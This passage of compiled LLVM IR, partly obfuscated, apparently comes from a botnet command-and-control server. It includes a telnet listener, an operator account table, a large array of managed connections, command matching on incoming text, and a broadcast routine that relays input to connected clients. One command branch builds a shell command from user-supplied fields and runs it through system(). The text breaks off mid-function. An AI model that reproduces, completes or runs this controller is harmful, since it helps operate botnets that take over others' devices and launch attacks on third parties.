  %1829 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1830 = call i32 (i8*, i8*, ...) @sprintf(i8* %1829, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.173, i32 0, i32 0)) #7
  %1831 = load i32, i32* %4, align 4
  %1832 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1833 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1834 = call i64 @strlen(i8* %1833) #8
  %1835 = call i64 @send(i32 %1831, i8* %1832, i64 %1834, i32 16384)
  %1836 = icmp eq i64 %1835, -1
  br i1 %1836, label %1837, label %1838

; <label>:1837:                                   ; preds = %1828
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1838:                                   ; preds = %1828
  br label %1839

; <label>:1839:                                   ; preds = %1838, %1824
  %1840 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1841 = call i8* @strstr(i8* %1840, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.174, i32 0, i32 0)) #8
  %1842 = icmp ne i8* %1841, null
  br i1 %1842, label %1843, label %1854

; <label>:1843:                                   ; preds = %1839
  %1844 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1845 = call i32 (i8*, i8*, ...) @sprintf(i8* %1844, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.175, i32 0, i32 0)) #7
  %1846 = load i32, i32* %4, align 4
  %1847 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1848 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1849 = call i64 @strlen(i8* %1848) #8
  %1850 = call i64 @send(i32 %1846, i8* %1847, i64 %1849, i32 16384)
  %1851 = icmp eq i64 %1850, -1
  br i1 %1851, label %1852, label %1853

; <label>:1852:                                   ; preds = %1843
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1853:                                   ; preds = %1843
  br label %1854

; <label>:1854:                                   ; preds = %1853, %1839
  %1855 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1856 = call i8* @strstr(i8* %1855, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.176, i32 0, i32 0)) #8
  %1857 = icmp ne i8* %1856, null
  br i1 %1857, label %1862, label %1858

; <label>:1858:                                   ; preds = %1854
  %1859 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1860 = call i8* @strstr(i8* %1859, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.177, i32 0, i32 0)) #8
  %1861 = icmp ne i8* %1860, null
  br i1 %1861, label %1862, label %1889

; <label>:1862:                                   ; preds = %1858, %1854
  %1863 = getelementptr inbounds [50 x i8*], [50 x i8*]* %110, i32 0, i32 0
  %1864 = bitcast i8** %1863 to i8*
  %1865 = getelementptr inbounds [100 x i8*], [100 x i8*]* %107, i32 0, i32 0
  %1866 = getelementptr inbounds [100 x i8*], [100 x i8*]* %108, i32 0, i32 0
  %1867 = getelementptr inbounds [100 x i8*], [100 x i8*]* %109, i32 0, i32 0
  %1868 = call i32 (i8*, i8*, ...) @sprintf(i8* %1864, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.178, i32 0, i32 0), i8** %1865, i8** %1866, i8** %1867) #7
  %1869 = getelementptr inbounds [50 x i8*], [50 x i8*]* %110, i32 0, i32 0
  %1870 = bitcast i8** %1869 to i8*
  %1871 = call i32 @system(i8* %1870)
  %1872 = getelementptr inbounds [100 x i8*], [100 x i8*]* %107, i32 0, i32 0
  %1873 = getelementptr inbounds [100 x i8*], [100 x i8*]* %108, i32 0, i32 0
  %1874 = getelementptr inbounds [100 x i8*], [100 x i8*]* %109, i32 0, i32 0
  %1875 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.179, i32 0, i32 0), i8** %1872, i8** %1873, i8** %1874)
  %1876 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1877 = getelementptr inbounds [100 x i8*], [100 x i8*]* %107, i32 0, i32 0
  %1878 = getelementptr inbounds [100 x i8*], [100 x i8*]* %108, i32 0, i32 0
  %1879 = getelementptr inbounds [100 x i8*], [100 x i8*]* %109, i32 0, i32 0
  %1880 = call i32 (i8*, i8*, ...) @sprintf(i8* %1876, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.179, i32 0, i32 0), i8** %1877, i8** %1878, i8** %1879) #7
  %1881 = load i32, i32* %4, align 4
  %1882 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1883 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1884 = call i64 @strlen(i8* %1883) #8
  %1885 = call i64 @send(i32 %1881, i8* %1882, i64 %1884, i32 16384)
  %1886 = icmp eq i64 %1885, -1
  br i1 %1886, label %1887, label %1888

; <label>:1887:                                   ; preds = %1862
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1888:                                   ; preds = %1862
  br label %1889

; <label>:1889:                                   ; preds = %1888, %1858
  %1890 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1891 = call i8* @strstr(i8* %1890, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.180, i32 0, i32 0)) #8
  %1892 = icmp ne i8* %1891, null
  br i1 %1892, label %1893, label %1904

; <label>:1893:                                   ; preds = %1889
  %1894 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1895 = call i32 (i8*, i8*, ...) @sprintf(i8* %1894, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.181, i32 0, i32 0)) #7
  %1896 = load i32, i32* %4, align 4
  %1897 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1898 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1899 = call i64 @strlen(i8* %1898) #8
  %1900 = call i64 @send(i32 %1896, i8* %1897, i64 %1899, i32 16384)
  %1901 = icmp eq i64 %1900, -1
  br i1 %1901, label %1902, label %1903

; <label>:1902:                                   ; preds = %1893
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1903:                                   ; preds = %1893
  br label %1904

; <label>:1904:                                   ; preds = %1903, %1889
  %1905 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1906 = call i8* @strstr(i8* %1905, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.182, i32 0, i32 0)) #8
  %1907 = icmp ne i8* %1906, null
  br i1 %1907, label %1908, label %1919

; <label>:1908:                                   ; preds = %1904
  %1909 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1910 = call i32 (i8*, i8*, ...) @sprintf(i8* %1909, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.183, i32 0, i32 0)) #7
  %1911 = load i32, i32* %4, align 4
  %1912 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1913 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1914 = call i64 @strlen(i8* %1913) #8
  %1915 = call i64 @send(i32 %1911, i8* %1912, i64 %1914, i32 16384)
  %1916 = icmp eq i64 %1915, -1
  br i1 %1916, label %1917, label %1918

; <label>:1917:                                   ; preds = %1908
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1918:                                   ; preds = %1908
  br label %1919

; <label>:1919:                                   ; preds = %1918, %1904
  %1920 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1921 = call i8* @strstr(i8* %1920, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.184, i32 0, i32 0)) #8
  %1922 = icmp ne i8* %1921, null
  br i1 %1922, label %1923, label %1934

; <label>:1923:                                   ; preds = %1919
  %1924 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1925 = call i32 (i8*, i8*, ...) @sprintf(i8* %1924, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.185, i32 0, i32 0)) #7
  %1926 = load i32, i32* %4, align 4
  %1927 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1928 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1929 = call i64 @strlen(i8* %1928) #8
  %1930 = call i64 @send(i32 %1926, i8* %1927, i64 %1929, i32 16384)
  %1931 = icmp eq i64 %1930, -1
  br i1 %1931, label %1932, label %1933

; <label>:1932:                                   ; preds = %1923
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1933:                                   ; preds = %1923
  br label %1934

; <label>:1934:                                   ; preds = %1933, %1919
  %1935 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1936 = call i8* @strstr(i8* %1935, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.186, i32 0, i32 0)) #8
  %1937 = icmp ne i8* %1936, null
  br i1 %1937, label %1938, label %1949

; <label>:1938:                                   ; preds = %1934
  %1939 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1940 = call i32 (i8*, i8*, ...) @sprintf(i8* %1939, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.187, i32 0, i32 0)) #7
  %1941 = load i32, i32* %4, align 4
  %1942 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1943 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1944 = call i64 @strlen(i8* %1943) #8
  %1945 = call i64 @send(i32 %1941, i8* %1942, i64 %1944, i32 16384)
  %1946 = icmp eq i64 %1945, -1
  br i1 %1946, label %1947, label %1948

; <label>:1947:                                   ; preds = %1938
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1948:                                   ; preds = %1938
  br label %1949

; <label>:1949:                                   ; preds = %1948, %1934
  %1950 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1951 = call i8* @strstr(i8* %1950, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.188, i32 0, i32 0)) #8
  %1952 = icmp ne i8* %1951, null
  br i1 %1952, label %1953, label %1964

; <label>:1953:                                   ; preds = %1949
  %1954 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1955 = call i32 (i8*, i8*, ...) @sprintf(i8* %1954, i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.189, i32 0, i32 0)) #7
  %1956 = load i32, i32* %4, align 4
  %1957 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1958 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1959 = call i64 @strlen(i8* %1958) #8
  %1960 = call i64 @send(i32 %1956, i8* %1957, i64 %1959, i32 16384)
  %1961 = icmp eq i64 %1960, -1
  br i1 %1961, label %1962, label %1963

; <label>:1962:                                   ; preds = %1953
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1963:                                   ; preds = %1953
  br label %1964

; <label>:1964:                                   ; preds = %1963, %1949
  %1965 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1966 = call i8* @strstr(i8* %1965, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.190, i32 0, i32 0)) #8
  %1967 = icmp ne i8* %1966, null
  br i1 %1967, label %1968, label %1979

; <label>:1968:                                   ; preds = %1964
  %1969 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1970 = call i32 (i8*, i8*, ...) @sprintf(i8* %1969, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.191, i32 0, i32 0)) #7
  %1971 = load i32, i32* %4, align 4
  %1972 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1973 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1974 = call i64 @strlen(i8* %1973) #8
  %1975 = call i64 @send(i32 %1971, i8* %1972, i64 %1974, i32 16384)
  %1976 = icmp eq i64 %1975, -1
  br i1 %1976, label %1977, label %1978

; <label>:1977:                                   ; preds = %1968
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1978:                                   ; preds = %1968
  br label %1979

; <label>:1979:                                   ; preds = %1978, %1964
  %1980 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1981 = call i8* @strstr(i8* %1980, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.192, i32 0, i32 0)) #8
  %1982 = icmp ne i8* %1981, null
  br i1 %1982, label %1983, label %1994

; <label>:1983:                                   ; preds = %1979
  %1984 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1985 = call i32 (i8*, i8*, ...) @sprintf(i8* %1984, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.193, i32 0, i32 0)) #7
  %1986 = load i32, i32* %4, align 4
  %1987 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1988 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1989 = call i64 @strlen(i8* %1988) #8
  %1990 = call i64 @send(i32 %1986, i8* %1987, i64 %1989, i32 16384)
  %1991 = icmp eq i64 %1990, -1
  br i1 %1991, label %1992, label %1993

; <label>:1992:                                   ; preds = %1983
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:1993:                                   ; preds = %1983
  br label %1994

; <label>:1994:                                   ; preds = %1993, %1979
  %1995 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1996 = call i8* @strstr(i8* %1995, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.194, i32 0, i32 0)) #8
  %1997 = icmp ne i8* %1996, null
  br i1 %1997, label %1998, label %2009

; <label>:1998:                                   ; preds = %1994
  %1999 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2000 = call i32 (i8*, i8*, ...) @sprintf(i8* %1999, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.195, i32 0, i32 0)) #7
  %2001 = load i32, i32* %4, align 4
  %2002 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2003 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2004 = call i64 @strlen(i8* %2003) #8
  %2005 = call i64 @send(i32 %2001, i8* %2002, i64 %2004, i32 16384)
  %2006 = icmp eq i64 %2005, -1
  br i1 %2006, label %2007, label %2008

; <label>:2007:                                   ; preds = %1998
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:2008:                                   ; preds = %1998
  br label %2009

; <label>:2009:                                   ; preds = %2008, %1994
  %2010 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2011 = call i8* @strstr(i8* %2010, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.196, i32 0, i32 0)) #8
  %2012 = icmp ne i8* %2011, null
  br i1 %2012, label %2013, label %2024

; <label>:2013:                                   ; preds = %2009
  %2014 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2015 = call i32 (i8*, i8*, ...) @sprintf(i8* %2014, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.197, i32 0, i32 0)) #7
  %2016 = load i32, i32* %4, align 4
  %2017 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2018 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2019 = call i64 @strlen(i8* %2018) #8
  %2020 = call i64 @send(i32 %2016, i8* %2017, i64 %2019, i32 16384)
  %2021 = icmp eq i64 %2020, -1
  br i1 %2021, label %2022, label %2023

; <label>:2022:                                   ; preds = %2013
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:2023:                                   ; preds = %2013
  br label %2024

; <label>:2024:                                   ; preds = %2023, %2009
  %2025 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2026 = call i8* @strstr(i8* %2025, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.198, i32 0, i32 0)) #8
  %2027 = icmp ne i8* %2026, null
  br i1 %2027, label %2028, label %2039

; <label>:2028:                                   ; preds = %2024
  %2029 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2030 = call i32 (i8*, i8*, ...) @sprintf(i8* %2029, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.199, i32 0, i32 0)) #7
  %2031 = load i32, i32* %4, align 4
  %2032 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2033 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2034 = call i64 @strlen(i8* %2033) #8
  %2035 = call i64 @send(i32 %2031, i8* %2032, i64 %2034, i32 16384)
  %2036 = icmp eq i64 %2035, -1
  br i1 %2036, label %2037, label %2038

; <label>:2037:                                   ; preds = %2028
  store i8* null, i8** %2, align 8
  br label %2126

; <label>:2038:                                   ; preds = %2028
  br label %2039

; <label>:2039:                                   ; preds = %2038, %2024
  %2040 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2041 = call i8* @strstr(i8* %2040, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.200, i32 0, i32 0)) #8
  %2042 = icmp ne i8* %2041, null
  br i1 %2042, label %2043, label %2044

; <label>:2043:                                   ; preds = %2039
  br label %279

; <label>:2044:                                   ; preds = %2039
  %2045 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2046 = call i8* @strstr(i8* %2045, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.201, i32 0, i32 0)) #8
  %2047 = icmp ne i8* %2046, null
  br i1 %2047, label %2048, label %2049

; <label>:2048:                                   ; preds = %2044
  br label %279

; <label>:2049:                                   ; preds = %2044
  %2050 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2051 = call i8* @strstr(i8* %2050, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.202, i32 0, i32 0)) #8
  %2052 = icmp ne i8* %2051, null
  br i1 %2052, label %2053, label %2054

; <label>:2053:                                   ; preds = %2049
  br label %279

; <label>:2054:                                   ; preds = %2049
  %2055 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2056 = call i8* @strstr(i8* %2055, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.203, i32 0, i32 0)) #8
  %2057 = icmp ne i8* %2056, null
  br i1 %2057, label %2058, label %2059

; <label>:2058:                                   ; preds = %2054
  br label %279

; <label>:2059:                                   ; preds = %2054
  %2060 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2061 = call i8* @strstr(i8* %2060, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.204, i32 0, i32 0)) #8
  %2062 = icmp ne i8* %2061, null
  br i1 %2062, label %2063, label %2064

; <label>:2063:                                   ; preds = %2059
  br label %2115

; <label>:2064:                                   ; preds = %2059
  %2065 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2066 = call i8* @strstr(i8* %2065, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.205, i32 0, i32 0)) #8
  %2067 = icmp ne i8* %2066, null
  br i1 %2067, label %2068, label %2069

; <label>:2068:                                   ; preds = %2064
  br label %2115

; <label>:2069:                                   ; preds = %2064
  %2070 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %2070)
  %2071 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2072 = load i32, i32* %5, align 4
  %2073 = sext i32 %2072 to i64
  %2074 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2073
  %2075 = getelementptr inbounds %struct.account, %struct.account* %2074, i32 0, i32 0
  %2076 = getelementptr inbounds [20 x i8], [20 x i8]* %2075, i32 0, i32 0
  %2077 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2078 = call i32 (i8*, i8*, ...) @sprintf(i8* %2071, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %2076, i8* %2077) #7
  %2079 = load i32, i32* %4, align 4
  %2080 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2081 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %2082 = call i64 @strlen(i8* %2081) #8
  %2083 = call i64 @send(i32 %2079, i8* %2080, i64 %2082, i32 16384)
  %2084 = icmp eq i64 %2083, -1
  br i1 %2084, label %2085, label %2086

; <label>:2085:                                   ; preds = %2069
  br label %2115

; <label>:2086:                                   ; preds = %2069
  %2087 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2088 = call i64 @strlen(i8* %2087) #8
  %2089 = icmp eq i64 %2088, 0
  br i1 %2089, label %2090, label %2091

; <label>:2090:                                   ; preds = %2086
  br label %351

; <label>:2091:                                   ; preds = %2086
  %2092 = load i32, i32* %5, align 4
  %2093 = sext i32 %2092 to i64
  %2094 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2093
  %2095 = getelementptr inbounds %struct.account, %struct.account* %2094, i32 0, i32 0
  %2096 = getelementptr inbounds [20 x i8], [20 x i8]* %2095, i32 0, i32 0
  %2097 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2098 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.206, i32 0, i32 0), i8* %2096, i8* %2097)
  %2099 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %2099, %struct._IO_FILE** %111, align 8
  %2100 = load %struct._IO_FILE*, %struct._IO_FILE** %111, align 8
  %2101 = load i32, i32* %5, align 4
  %2102 = sext i32 %2101 to i64
  %2103 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2102
  %2104 = getelementptr inbounds %struct.account, %struct.account* %2103, i32 0, i32 0
  %2105 = getelementptr inbounds [20 x i8], [20 x i8]* %2104, i32 0, i32 0
  %2106 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2107 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2100, i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.206, i32 0, i32 0), i8* %2105, i8* %2106)
  %2108 = load %struct._IO_FILE*, %struct._IO_FILE** %111, align 8
  %2109 = call i32 @fclose(%struct._IO_FILE* %2108)
  %2110 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2111 = load i32, i32* %4, align 4
  %2112 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i32 0, i32 0
  call void @broadcast(i8* %2110, i32 %2111, i8* %2112)
  %2113 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %2113, i8 0, i64 2048, i32 16, i1 false)
  br label %351

; <label>:2114:                                   ; preds = %351
  br label %2115

; <label>:2115:                                   ; preds = %2114, %2085, %2068, %2063, %1446, %1419, %1396, %1389, %1370, %1362, %1354, %1346, %1338, %1330, %1322, %1314, %1266, %1247, %1239, %1231, %1223, %1215, %1207, %1199, %1191, %1183, %1175, %1167, %1159, %1151, %1143, %1135, %1127, %1119, %1111, %1103, %1095, %1087, %1079, %1071, %1001, %982, %974, %966, %958, %950, %908, %889, %881, %873, %865, %857, %849, %841, %833, %825, %817, %809, %801, %751, %732, %724, %716, %708, %700, %692, %684, %676, %632, %613, %605, %597, %589, %581, %573, %565, %525, %506, %498, %490, %482, %474, %466, %458, %450, %442, %434, %426, %342, %325, %317, %309, %301, %290, %285, %277, %276, %268, %260, %228, %222, %196, %190, %180
  %2116 = load i32, i32* %4, align 4
  %2117 = sext i32 %2116 to i64
  %2118 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %2117
  %2119 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %2118, i32 0, i32 1
  store i32 0, i32* %2119, align 4
  %2120 = load i32, i32* %4, align 4
  %2121 = call i32 @close(i32 %2120)
  %2122 = load volatile i32, i32* @managesConnected, align 4
  %2123 = sub i32 0, -1
  %2124 = sub i32 %2122, %2123
  %2125 = add nsw i32 %2122, -1
  store volatile i32 %2124, i32* @managesConnected, align 4
  br label %2126

; <label>:2126:                                   ; preds = %2115, %2037, %2022, %2007, %1992, %1977, %1962, %1947, %1932, %1917, %1902, %1887, %1852, %1837, %1822, %1807, %1792, %1777, %1762, %1747, %1732, %1717, %1702, %1687, %1672, %1657, %1642, %1615, %1550, %1512, %1497, %1482
  %2127 = load i8*, i8** %2, align 8
  ret i8* %2127
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

declare i32 @resolve(...) #1

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i8* @telnetListener(i32) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct._IO_FILE*, align 8
  %10 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  %11 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %11, i32* %4, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %12, 0
  br i1 %13, label %14, label %15

; <label>:14:                                     ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.207, i32 0, i32 0))
  br label %15

; <label>:15:                                     ; preds = %14, %1
  %16 = bitcast %struct.sockaddr_in* %7 to i8*
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 16, i32 4, i1 false)
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %19 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %18, i32 0, i32 0
  store i32 0, i32* %19, align 4
  %20 = load i32, i32* %3, align 4
  %21 = trunc i32 %20 to i16
  %22 = call zeroext i16 @htons(i16 zeroext %21) #9
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %4, align 4
  %25 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %26 = call i32 @bind(i32 %24, %struct.sockaddr* %25, i32 16) #7
  %27 = icmp slt i32 %26, 0
  br i1 %27, label %28, label %29

; <label>:28:                                     ; preds = %15
  call void @perror(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.208, i32 0, i32 0))
  br label %29

; <label>:29:                                     ; preds = %28, %15
  %30 = load i32, i32* %4, align 4
  %31 = call i32 @listen(i32 %30, i32 5) #7
  store i32 16, i32* %6, align 4
  br label %32

; <label>:32:                                     ; preds = %93, %29
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.209, i32 0, i32 0))
  %34 = bitcast %struct.sockaddr_in* %8 to { i64, i64 }*
  %35 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %34, i32 0, i32 0
  %36 = load i64, i64* %35, align 4
  %37 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %34, i32 0, i32 1
  %38 = load i64, i64* %37, align 4
  call void @client_addr(i64 %36, i64 %38)
  %39 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %39, %struct._IO_FILE** %9, align 8
  %40 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %42 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 4
  %44 = xor i32 255, -1
  %45 = xor i32 %43, %44
  %46 = and i32 %45, %43
  %47 = and i32 %43, 255
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %49 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %48, i32 0, i32 0
  %50 = load i32, i32* %49, align 4
  %51 = xor i32 %50, -1
  %52 = xor i32 65280, -1
  %53 = xor i32 -1274409074, -1
  %54 = or i32 %51, %52
